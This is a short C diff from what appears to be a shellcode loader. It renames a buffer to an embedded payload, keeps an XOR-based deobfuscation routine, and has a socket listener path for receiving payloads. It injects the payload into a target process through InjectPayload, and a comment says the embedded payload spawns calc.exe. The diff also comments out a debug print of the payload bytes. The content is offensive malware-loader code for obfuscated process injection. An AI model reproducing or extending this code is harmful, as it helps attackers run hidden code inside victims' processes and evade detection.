@@ -9,7 +9,7 @@
 void RemoveEntropy()
 {
     for(int i = 0; i < BUFFER_Size; ++i)
-        buf[i] ^= (buf[i + BUFFER_Size] << 4);
+        embeded_payload[i] ^= (embeded_payload[i + BUFFER_Size] << 4);
 }
 
 BOOL IsDuplicate()
@@ -141,7 +141,7 @@ int main()
     #endif
     
 
-    unsigned char * buffer;
+    unsigned char * payload;
     
     unsigned char * key;
     int keylen;
@@ -150,7 +150,7 @@ int main()
 
     #ifdef PAYLOAD_EMBED    // spawn calc.exe
     //RemoveEntropy();      //deobfuscate payload
-    buffer = buf;
+    payload = embeded_payload;
     #else
     SOCKET pSocket;
     Listenner(&pSocket);
@@ -166,8 +166,8 @@ int main()
     {
         // PayloadDecrypt(buffer + 0x10, BUFFER_Size, keybuffer + 0x10, KEY_Size);
         // PayloadReEncrypt(buffer + 0x10, BUFFER_Size);
-        printf("%d\n", buffer[0]);
-        InjectPayload(hProcess, buffer , BUFFER_Size);
+        //printf("%d\n", payload[0]);
+        InjectPayload(hProcess, payload , BUFFER_Size);
     }
     else
     {
